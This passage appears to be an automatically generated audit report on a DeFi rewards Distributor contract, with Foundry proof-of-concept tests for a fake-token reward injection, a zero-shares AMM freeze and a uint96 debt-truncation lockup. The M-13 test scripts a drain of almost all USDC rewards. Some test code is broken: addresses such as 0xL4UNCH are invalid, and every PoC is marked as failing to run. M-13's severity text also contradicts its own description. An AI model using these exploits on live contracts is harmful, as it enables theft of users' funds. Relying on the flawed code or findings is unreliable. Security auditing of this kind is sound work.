An attacker can call `addRewards(LaunchToken, JunkToken, 0, amount)`. The contract updates the internal `rs.pendingQuoteRewards` (thinking it's the legitimate quote asset) but increments `totalPendingRewards[JunkToken]` globally. When legitimate users call `claimRewards`, the contract calculates the payout based on the inflated `rs.pendingQuoteRewards` and attempts to transfer `rs.quoteAsset`. The transfer fails at `_decreaseTotalPending` because `totalPendingRewards[RealQuote]` was never incremented, triggering an underflow revert.

## Impact
A permissionless caller can permanently inflate pendingQuoteRewards for any pool by passing a non-matching quote token to addRewards. This causes the pool to accrue quote rewards accounted against an unrelated asset in totalPendingRewards. Thereafter, any claimRewards and any stake/unstake path (increaseStake/decreaseStake) that settles matured quote rewards will revert at _decreaseTotalPending for the real rs.quoteAsset. This results in a denial-of-service for reward claiming and staking adjustments for the affected pool, and it can be repeated to keep the pool locked until governance manually backfills sufficient real quote-asset pending rewards (which is economically undesirable).

## Command to Run Test


## Proof of Concept
Setup: A pool exists for LAUNCH/USDC in Distributor. The pool’s rs.quoteAsset == USDC and rs.totalShares > 0.

Exploit:
1) Attacker mints an arbitrary token JUNK and approves Distributor.
2) Attacker calls Distributor.addRewards(LAUNCH, JUNK, 0, X).
   - rs is resolved using token0=LAUNCH; rs.quoteAsset != 0 so the token orientation remains (launchAsset=LAUNCH, quoteAsset=JUNK).
   - rs.addQuoteRewards increments rs.pendingQuoteRewards by X, but totalPendingRewards[JUNK] is incremented (not USDC).
   - JUNK is transferred into Distributor.
3) Any subsequent rs.update() (via claimRewards/increaseStake/decreaseStake) rolls pendingQuoteRewards into accQuoteRewardPerShare. Users now have nonzero quote rewards.
4) When a user tries to claim or when stake/unstake attempts to settle matured rewards, _distributeAssets(..., rs.quoteAsset, quoteAmount) calls _decreaseTotalPending(USDC, quoteAmount), but totalPendingRewards[USDC] did not increase for the bogus rewards, so it reverts with ClaimAmountExceedsTotalPendingRewards.

Result: Claiming and staking adjustments are DoSed for the pool.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory n, string memory s) { name = n; symbol = s; }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
        emit Transfer(address(0), to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allow");
        require(balanceOf[from] >= amount, "bal");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }
}

contract DistributorDoSTest is Test {
    Distributor internal distributor;
    MockERC20 internal LAUNCH;
    MockERC20 internal USDC;
    MockERC20 internal JUNK;

    address internal attacker = address(0xA11CE);
    address internal user = address(0xBEEF);

    function setUp() public {
        distributor = new Distributor();
        LAUNCH = new MockERC20("LAUNCH", "L");
        USDC = new MockERC20("USD Coin", "USDC");
        JUNK = new MockERC20("JUNK", "JNK");

        // Set launchpad to this test contract
        distributor.initialize(address(this));

        // Create a rewards pair for LAUNCH/USDC (onlyLaunchpad)
        distributor.createRewardsPair(address(LAUNCH), address(USDC));

        // Give the pool nonzero shares so addRewards is allowed
        distributor.increaseStake(address(LAUNCH), user, uint96(100));

        // Fund attacker with JUNK and approve Distributor
        JUNK.mint(attacker, 1_000e18);
        vm.prank(attacker);
        JUNK.approve(address(distributor), type(uint256).max);

        // Attacker adds rewards with mismatched quote token (JUNK instead of USDC)
        vm.prank(attacker);
        distributor.addRewards(address(LAUNCH), address(JUNK), 0, uint128(100e18));

        // Global accounting was bumped for JUNK, not USDC
        assertEq(distributor.totalPendingRewards(address(JUNK)), 100e18, "JUNK pending not recorded");
        assertEq(distributor.totalPendingRewards(address(USDC)), 0, "USDC pending should be 0");
    }

    function test_DoS_on_claim_and_stake() public {
        // User attempts to claim rewards: should revert because pending was accounted under JUNK instead of USDC
        vm.prank(user);
        vm.expectRevert(Distributor.ClaimAmountExceedsTotalPendingRewards.selector);
        distributor.claimRewards(address(LAUNCH));

        // Even launchpad stake adjustments will revert trying to settle matured rewards
        vm.expectRevert(Distributor.ClaimAmountExceedsTotalPendingRewards.selector);
        distributor.increaseStake(address(LAUNCH), user, uint96(1));
    }
}


## Suggested Mitigation
In addRewards, after determining the correct orientation for (launchAsset, quoteAsset), enforce that the provided quote matches the pool’s configured quote asset. Example:

- Add a custom error: error InvalidQuoteAsset();
- After rs is resolved and (launchAsset, quoteAsset) are set, add:
  if (quoteAsset != rs.quoteAsset) revert InvalidQuoteAsset();

This ensures pendingQuoteRewards can only be credited for the legitimate quote token, keeping totalPendingRewards in sync with subsequent _decreaseTotalPending(quote, ...). Consider also simplifying the API to remove ambiguity, e.g. addRewardsForPair(launchAsset, uint128 baseAmount, uint128 quoteAmount) where the quote asset is implicitly rs.quoteAsset, and revert on any nonzero amount for the wrong token. Optionally, further harden by emitting and verifying the expected quote asset in the event or by pulling tokens strictly based on rs.quoteAsset rather than a user-supplied address.





 **Derived From** : Issue Type: AccountingInvariantViolation

## [H-11]. AMM Denial of Service when Distributor has Zero Shares

### Finding Severity Justification: GTELaunchpadV2Pair distributes accrued fees by calling Distributor.addRewards during _update. Distributor.addRewards reverts with NoSharesToIncentivize when rs.totalShares == 0. If this occurs (e.g., immediately after rewards pair creation before any stake is registered, or if shares are removed before endRewardsAccrual is called), every path that hits _update and attempts distribution (swap/mint/burn/sync on the first call per block with accrued fees) will revert. This can brick the AMM: trading halts and LPs cannot burn liquidity. Because LP tokens may be transferred to the pair prior to burn, a reverting burn can effectively lock user funds until privileged intervention, constituting a high-impact availability failure.
## Derived From Pattern/Invariant
Issue Type: AccountingInvariantViolation

## Exploit Type
Dos

## Location
Distributor.addRewards

## Finding Status: Valid
## Status Confidence: SomeWhatConfident
### Finding Confidence Justification: The broader launchpad orchestration (exact timing of pair creation vs. staking and endRewardsAccrual) is not fully provided, so totalShares == 0 may be avoided operationally. However, from the provided contracts alone the revert condition is unconditional, and a realistic sequence can produce it. In line with C4 guidance, we lean Valid with some uncertainty due to missing surrounding flow code.
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `GTELaunchpadV2Pair` contract automatically calls `Distributor.addRewards` on every reserve update (triggered by `mint`, `burn`, or `swap`) to distribute accumulated fees. The `Distributor.addRewards` function contains a check that reverts if there are no stakers in the pool.

Code Snippet (`Distributor.sol`):
```solidity
if (rs.totalShares == 0) revert NoSharesToIncentivize();
```

If a pool has zero stakers (e.g., immediately after pair creation or if all users unstake), `totalShares` is 0. Consequently, `addRewards` reverts. Because `GTELaunchpadV2Pair._update` calls this function in the critical path of `swap`, `mint`, and `burn`, the entire AMM pair becomes unusable. No trades or liquidity provision can occur until someone interacts directly with the Distributor to stake, which might not be possible if they need to buy tokens from the blocked AMM first.

## Impact
Denial of service of the AMM pair whenever launchpad fees must be distributed and the Distributor pool has zero shares. As soon as any launchpad fees accrue, the next reserve update in a later block will attempt to call Distributor.addRewards and revert with NoSharesToIncentivize if totalShares == 0. This reverts swap/mint/burn/sync, effectively freezing trading and liquidity operations. The condition persists across transactions (since accrued fees are not cleared on revert) until a privileged party ends rewards accrual on the pair or reintroduces shares, making this a high-impact availability failure.

## Command to Run Test


## Proof of Concept
Reproduction steps (no assumptions beyond contracts in repo):
1) Deploy Distributor and set launchpad to the caller (Distributor.initialize(caller)).
2) Deploy GTELaunchpadV2Pair; initialize with token0, token1, launchpadLp, and launchpadFeeDistributor = Distributor.
3) As launchpad, call Distributor.createRewardsPair(token0, token1). Do not stake any shares (totalShares remains 0).
4) Provide initial liquidity to the pair (transfer token0 and token1 to the pair, then call pair.mint(launchpadLp)). This sets blockTimestampLast in _update.
5) Move time forward to a new block (block.timestamp + 1).
6) Make a swap that pays a non-zero launchpad fee: transfer a sufficiently large amount of token0 to the pair (e.g., >= 1000 units), then call pair.swap(0, 1, user, '').
7) During swap -> _update runs with timeElapsed > 0 and newLaunchpadFee0 > 0 -> _distributeLaunchpadFees -> Distributor.addRewards -> rs.totalShares == 0 -> revert NoSharesToIncentivize, bricking the operation. Subsequent swap/mint/burn that touches _update in a later block will continue to revert while fees remain accrued and totalShares == 0.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";
import {GTELaunchpadV2Pair} from "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s, uint8 d) {
        name = n; symbol = s; decimals = d;
    }
    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount; totalSupply += amount;
    }
    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount; balanceOf[to] += amount; return true;
    }
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount; return true;
    }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        require(balanceOf[from] >= amount && (a == type(uint256).max || a >= amount), "tf");
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount; balanceOf[to] += amount; return true;
    }
}

contract AMMDosZeroSharesTest is Test {
    MockERC20 token0;
    MockERC20 token1;
    Distributor distributor;
    GTELaunchpadV2Pair pair;
    address launchpadLp = address(0xBEEF);

    function setUp() public {
        token0 = new MockERC20("T0", "T0", 18);
        token1 = new MockERC20("T1", "T1", 18);
        distributor = new Distributor();
        // owner is this test contract; set launchpad to this test contract
        distributor.initialize(address(this));

        pair = new GTELaunchpadV2Pair();
        pair.initialize(address(token0), address(token1), launchpadLp, address(distributor));

        // Create rewards pool (onlyLaunchpad)
        distributor.createRewardsPair(address(token0), address(token1));

        // Seed liquidity and mint LP to launchpadLp
        uint256 liq0 = 1_000_000 ether;
        uint256 liq1 = 1_000_000 ether;
        token0.mint(address(this), liq0 + 1_000_000 ether);
        token1.mint(address(this), liq1 + 1_000_000 ether);
        token0.transfer(address(pair), liq0);
        token1.transfer(address(pair), liq1);
        pair.mint(launchpadLp);

        // Advance time so _update enters timeElapsed > 0 branch on next call
        vm.warp(block.timestamp + 1);
    }

    function test_AMM_DoS_ZeroShares() public {
        // Ensure no one has staked: totalShares == 0 by construction
        // Prepare a swap that generates non-zero launchpad fee
        uint256 amount0In = 1000 ether; // ensures fee0 >= 1 unit
        token0.transfer(address(pair), amount0In);

        // Expect revert bubbling from Distributor.addRewards when fees are distributed
        vm.expectRevert(Distributor.NoSharesToIncentivize.selector);
        pair.swap(0, 1, address(this), "");
    }
}


## Suggested Mitigation
Make Distributor.addRewards tolerant to zero-share pools so fees are accrued but not distributed yet. Instead of reverting, accept the tokens, record them as pending, and return early. This preserves liveness of the AMM while deferring distribution until shares exist.

Suggested change in Distributor.addRewards:
- Remove the `if (rs.totalShares == 0) revert NoSharesToIncentivize();` check.
- Optionally, replace it with a non-reverting path that just credits `pendingBaseRewards` / `pendingQuoteRewards` and `totalPendingRewards`:

if (rs.totalShares == 0) {
    if (launchAssetAmount > 0) {
        rs.addBaseRewards(launchAsset, launchAssetAmount);
        _increaseTotalPending(launchAsset, launchAssetAmount);
        launchAsset.safeTransferFrom(msg.sender, address(this), uint256(launchAssetAmount));
    }
    if (quoteAssetAmount > 0) {
        rs.addQuoteRewards(launchAsset, quoteAsset, quoteAssetAmount);
        _increaseTotalPending(quoteAsset, quoteAssetAmount);
        quoteAsset.safeTransferFrom(msg.sender, address(this), uint256(quoteAssetAmount));
    }
    return; // Accrued for future distribution when shares > 0
}

Alternatively, harden GTELaunchpadV2Pair to avoid bricking if the distributor reverts by wrapping the external call in try/catch and restoring accrued fee state on failure; however, fixing addRewards is simpler and ensures rewards still accrue for later distribution.





 **Derived From** : Arithmetic Invariant: user.baseRewardDebt == uint96((shares * accBaseRewardPerShare) / 1e12)

## [H-12]. Permanent DoS of Reward Pool via `uint96` Debt Overflow

### Finding Severity Justification: Reward accounting stores user reward debts in uint96 while accRewardPerShare and intermediate math use uint256. Because addRewards is permissionless and only gated by totalShares > 0, an attacker can inflate accRewardPerShare by adding large rewards when totalShares is tiny. On the next stake/claim/unstake, totalAccRewards can exceed 2^96-1, truncating on assignment to baseRewardDebt/quoteRewardDebt. Subsequent pending = full uint256 accrual minus truncated debt becomes absurdly large, causing _decreaseTotalPending to revert. This bricks claim/unstake, effectively locking user funds and DoSing the pool. Impact is user fund lock and protocol liveness failure, so High.
## Derived From Pattern/Invariant
Arithmetic Invariant: user.baseRewardDebt == uint96((shares * accBaseRewardPerShare) / 1e12)

## Exploit Type
IntegerOverflow

## Location
Distributor.addRewards

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `UserRewardData` struct stores `baseRewardDebt` as a `uint96`. The debt is calculated as `(shares * accRewardPerShare) / 1e12`. An attacker can manipulate `accRewardPerShare` to an extremely high value by adding rewards when the `totalShares` in the pool is very low (e.g., 1 wei). By adding a large reward amount relative to the 1 wei share, the accumulator spikes. If `shares * acc / 1e12` exceeds `type(uint96).max` (~7.9e28), the cast to `uint96` truncates the debt value. 

When a victim subsequently stakes a normal amount (e.g., 1e18 shares), their recorded debt is truncated (modulo 2^96). When they later attempt to unstake or claim, the contract calculates the full pending reward using `uint256` math minus the truncated debt. This results in a phantom pending reward value that exceeds the Distributor's `totalPendingRewards`. The `_decreaseTotalPending` check fails, causing the transaction to revert. The victim's funds are permanently locked.

## Impact
Due to uint96 truncation of user reward debts while accumulators and intermediate math use uint256, an attacker can add large rewards when totalShares is tiny to make accRewardPerShare enormous. When a user later stakes, their recorded debt is truncated, and any subsequent claim or unstake computes a gigantic pending amount (full uint256 accrual minus truncated debt). This exceeds Distributor.totalPendingRewards and causes _decreaseTotalPending to revert, bricking claimRewards and decreaseStake for affected users. There is no admin path to repair corrupted debts, so funds can be permanently locked until redeploy/migration.

## Command to Run Test


## Proof of Concept
Attack outline:
- Preconditions: A rewards pool exists and has very low totalShares (e.g., 1 wei). addRewards is permissionless and only requires totalShares > 0.
- Step 1: Attacker obtains a minimal stake (e.g., 1 share), so rs.totalShares = 1.
- Step 2: Attacker calls addRewards with a very large amount for the base token. On the next state update (stake/unstake/claim), accBaseRewardPerShare increases by pendingBaseRewards * 1e12 / totalShares, i.e., approximately pendingBaseRewards * 1e12 (very large).
- Step 3: Victim stakes a normal amount (e.g., 1e18 shares). During stake(), userData.baseRewardDebt is set to uint96(totalAccRewards(newShares, accBaseRewardsPerShare)). Since totalAccRewards is huge (≈ shares * pendingBaseRewards), it exceeds 2^96-1 and truncates when cast to uint96.
- Step 4: Later, victim calls claimRewards or decreaseStake. The library computes pending = totalAccRewards(shares, accBaseRewardPerShare) - userData.baseRewardDebt using uint256 math for the first term but subtracts the truncated uint96 second term, resulting in an astronomically large pending value.
- Step 5: Distributor._distributeAssets() calls _decreaseTotalPending(asset, pending). Since totalPendingRewards only reflects the real rewards added (much smaller), pending > totalPendingRewards, so ClaimAmountExceedsTotalPendingRewards() reverts. The victim cannot claim or unstake, effectively locking funds.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory n, string memory s, uint8 d) { name = n; symbol = s; decimals = d; }

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allowance");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
    }
}

contract DistributorDebtDosTest is Test {
    Distributor distributor;
    MockERC20 base;
    MockERC20 quote;

    address owner = address(this);
    address launchpad = address(0xL4UNCH);
    address attacker = address(0xA11CE);
    address victim = address(0xV1CT1M);

    function setUp() public {
        distributor = new Distributor();
        base = new MockERC20("BASE","B",18);
        quote = new MockERC20("QUOTE","Q",18);

        // Set launchpad and create rewards pair
        distributor.initialize(launchpad);
        vm.prank(launchpad);
        distributor.createRewardsPair(address(base), address(quote));

        // Give attacker 1 share so totalShares > 0
        vm.prank(launchpad);
        distributor.increaseStake(address(base), attacker, 1);
    }

    function test_DoS_viaUint96DebtTruncation() public {
        // Inflate accBaseRewardPerShare with huge rewards when totalShares == 1
        uint128 hugeReward = 1_000_000_000_000_000_000_000_000; // 1e24
        base.mint(attacker, hugeReward);
        vm.startPrank(attacker);
        base.approve(address(distributor), hugeReward);
        distributor.addRewards(address(base), address(quote), hugeReward, 0);
        vm.stopPrank();

        // Victim stakes a normal amount; their debt will truncate to uint96
        uint96 victimShares = 1e18; // typical size
        vm.prank(launchpad);
        distributor.increaseStake(address(base), victim, victimShares);

        // Now victim cannot claim: computed pending > totalPendingRewards -> revert
        vm.expectRevert(Distributor.ClaimAmountExceedsTotalPendingRewards.selector);
        vm.prank(victim);
        distributor.claimRewards(address(base));

        // And victim cannot unstake for the same reason (locked funds)
        vm.expectRevert(Distributor.ClaimAmountExceedsTotalPendingRewards.selector);
        vm.prank(launchpad);
        distributor.decreaseStake(address(base), victim, victimShares);
    }
}


## Suggested Mitigation
Store reward debts in full-width integers and remove lossy casts: change UserRewardData.baseRewardDebt and .quoteRewardDebt from uint96 to uint256, and update all arithmetic to subtract the full 256-bit debt (remove uint96/uint128 casts in claim/getPendingRewards/stake/unstake). Optionally, add a checked cast or explicit require when assigning debts if a narrower type is insisted upon, e.g., require(totalAccRewards(...) <= type(uint96).max) to fail early during addRewards abuse rather than corrupt debts. As an additional defense-in-depth, bound addRewards amounts relative to totalShares to prevent extreme accRewardPerShare spikes.





 **Derived From** : quoteAsset == RewardsTrackerStorage.getRewardPool(launchAsset).quoteAsset

## [M-13]. Arbitrary Token Injection Allows Draining of Distributor Quote Assets

### Finding Severity Justification: addRewards does not verify that the provided quote token matches the pool’s configured quoteAsset. This allows an attacker to inject arbitrary tokens and inflate pendingQuoteRewards, corrupting the reward index. While the Claim flow is guarded by totalPendingRewards[asset] and will revert if insufficient real quote asset exists (preventing a full drain), the mismatch enables: (a) denial-of-service on claims/stake updates due to inflated owed amounts exceeding available pending quote tokens, and (b) misallocation/theft of real quote assets up to the attacker’s share fraction of total pending quote balance. Impact is significant to protocol function and can cause loss of funds proportionate to attacker’s shares, but not an unlimited drain.
## Derived From Pattern/Invariant
quoteAsset == RewardsTrackerStorage.getRewardPool(launchAsset).quoteAsset

## Exploit Type
StorageLayout

## Location
Distributor.addRewards

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
In `Distributor.addRewards`, the function identifies the correct Reward Pool (`rs`) for a given `token0`/`token1` pair but fails to verify that the supplied quote token matches the pool's configured `quoteAsset`. An attacker can call `addRewards` with a valid Launch Asset and a worthless `FakeToken` (as the quote asset). The function will erroneously increment the pool's `pendingQuoteRewards` accumulator by the `FakeToken` amount. 

When legitimate users or the attacker subsequently call `claimRewards`, the system calculates the payout based on the inflated `pendingQuoteRewards` but executes the transfer using the pool's *configured* (and valuable) `quoteAsset` (e.g., USDC). This mismatch allows an attacker to drain the Distributor's entire balance of the valuable quote asset by contributing worthless tokens.

## Impact
An attacker can add rewards using an arbitrary quote token that does not match the pool’s configured quoteAsset. This inflates pendingQuoteRewards and the accQuoteRewardPerShare for the pool. When the attacker claims, the Distributor transfers the pool’s configured quoteAsset (e.g., USDC) and decrements totalPendingRewards[quoteAsset] for that real token. By choosing the fake amount F appropriately, an attacker holding even a tiny share fraction s/S can claim nearly the entire real USDC pot Q in a single claim: set F ≈ Q*(S/s - 1), so the attacker’s owed becomes ~Q and the claim succeeds because it does not exceed totalPendingRewards[USDC]. This effectively steals the legitimate USDC rewards owed to other users and leaves them reverted on claim due to insufficient totalPendingRewards. The theft is bounded by the Distributor’s real-asset balance for that token (i.e., totalPendingRewards[quoteAsset]), but because totalPendingRewards is global per asset, the attacker can drain USDC funded by other pools as well. This also creates a sustained DoS on other users’ claims and stake updates unless the protocol replenishes the drained quote asset.

## Command to Run Test


## Proof of Concept
High-level exploit steps:
1) There exists a rewards pool for LaunchToken with configured quoteAsset = USDC and totalShares S > 0. Attacker holds s shares (s << S), others hold S - s.
2) Legitimate rewards Q USDC are added via Distributor.addRewards(LaunchToken, USDC, 0, Q), which increases rs.pendingQuoteRewards by Q and totalPendingRewards[USDC] by Q.
3) Attacker mints a worthless FakeToken and calls Distributor.addRewards(LaunchToken, FakeToken, 0, F), with F chosen as F = Q*(S/s - 1) - 1 to keep the attacker’s computed claim just below Q (avoid revert on _decreaseTotalPending(USDC)). This inflates rs.pendingQuoteRewards and accQuoteRewardPerShare but increases totalPendingRewards[FakeToken] (not USDC).
4) Attacker claims: Distributor.claimRewards(LaunchToken) computes quoteAmount = floor(s/S * (Q + F)). With the chosen F, quoteAmount ≈ Q. The Distributor then transfers USDC (the real rs.quoteAsset) to the attacker and decrements totalPendingRewards[USDC] by quoteAmount, effectively draining almost the entire USDC pot.
5) Other users’ claims now revert due to ClaimAmountExceedsTotalPendingRewards because their owed amounts (also inflated by F) exceed the remaining totalPendingRewards[USDC] balance.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";

contract ERC20Mock {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory n, string memory s) { name = n; symbol = s; }

    function mint(address to, uint256 amount) external { balanceOf[to] += amount; emit Transfer(address(0), to, amount); }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount; emit Approval(msg.sender, spender, amount); return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount; balanceOf[to] += amount; emit Transfer(msg.sender, to, amount); return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 a = allowance[from][msg.sender];
        require(a >= amount, "allow");
        require(balanceOf[from] >= amount, "bal");
        if (a != type(uint256).max) allowance[from][msg.sender] = a - amount;
        balanceOf[from] -= amount; balanceOf[to] += amount; emit Transfer(from, to, amount); return true;
    }
}

contract DistributorArbitraryQuoteInjectionTest is Test {
    Distributor distributor;
    ERC20Mock launchToken;
    ERC20Mock usdc;
    ERC20Mock fake;

    address attacker = address(0xA11CE);
    address victim = address(0xB0B);

    function setUp() public {
        distributor = new Distributor();
        // owner is this contract; set launchpad to this contract for onlyLaunchpad ops
        distributor.initialize(address(this));

        launchToken = new ERC20Mock("Launch", "LNCH");
        usdc = new ERC20Mock("USDC", "USDC");
        fake = new ERC20Mock("FAKE", "FAKE");

        // Create rewards pair (onlyLaunchpad)
        distributor.createRewardsPair(address(launchToken), address(usdc));

        // Seed shares: victim large, attacker tiny
        uint96 victimShares = 9999;
        uint96 attackerShares = 1;
        distributor.increaseStake(address(launchToken), victim, victimShares);
        distributor.increaseStake(address(launchToken), attacker, attackerShares);

        // Fund legitimate USDC rewards Q
        uint256 Q = 1000 ether;
        usdc.mint(address(this), Q);
        usdc.approve(address(distributor), Q);
        distributor.addRewards(address(launchToken), address(usdc), 0, uint128(Q));

        // Attacker mints FAKE and injects arbitrary F as "quote"
        // Choose F = Q*(S/s - 1) - 1 with s=1, S=10000 -> F = Q*(9999) - 1
        uint256 S = uint256(victimShares) + uint256(attackerShares); // 10000
        uint256 s = uint256(attackerShares); // 1
        uint256 F = Q * ((S - s) / s) - 1; // Q*(S-1) - 1

        vm.prank(attacker);
        fake.mint(attacker, F);
        vm.prank(attacker);
        fake.approve(address(distributor), F);
        vm.prank(attacker);
        distributor.addRewards(address(launchToken), address(fake), 0, uint128(F));
    }

    function testArbitraryQuoteTokenInflationDrainsUSDC() public {
        uint256 pre = usdc.balanceOf(attacker);

        // Attacker claims: computes quoteAmount ~= Q and pulls real USDC
        vm.prank(attacker);
        distributor.claimRewards(address(launchToken));

        uint256 got = usdc.balanceOf(attacker) - pre;
        // Attacker receives nearly the entire real USDC pot
        assertGt(got, 999 ether); // > 99.9% of 1000 USDC allowing rounding

        // Distributor's USDC is drained to dust
        uint256 remaining = usdc.balanceOf(address(distributor));
        assertLt(remaining, 1 ether); // only dust may remain due to rounding

        // Victim attempting to claim will revert due to insufficient totalPendingRewards[USDC]
        vm.prank(victim);
        vm.expectRevert();
        distributor.claimRewards(address(launchToken));
    }
}


## Suggested Mitigation
In Distributor.addRewards, validate the quote token strictly against the pool configuration and use the configured assets for transfers:
- Identify the reward pool (rs) exactly as today.
- Require that the provided quoteAsset equals rs.quoteAsset when quoteAssetAmount > 0. If it does not match, revert.
- Similarly, ensure that the provided launchAsset matches the pool base asset when launchAssetAmount > 0 (i.e., the asset that keyed the pool lookup must be the base asset).
- Optionally harden further by ignoring the caller-supplied quote token address entirely and always using rs.quoteAsset for the quote leg transferFrom and totalPendingRewards bookkeeping. This eliminates any possibility of mismatched accounting and cross-pool leakage.
- Consider tracking pending balances per pool (not only per asset) so that claims from one pool cannot consume the pending asset balance originating from other pools using the same quote token.



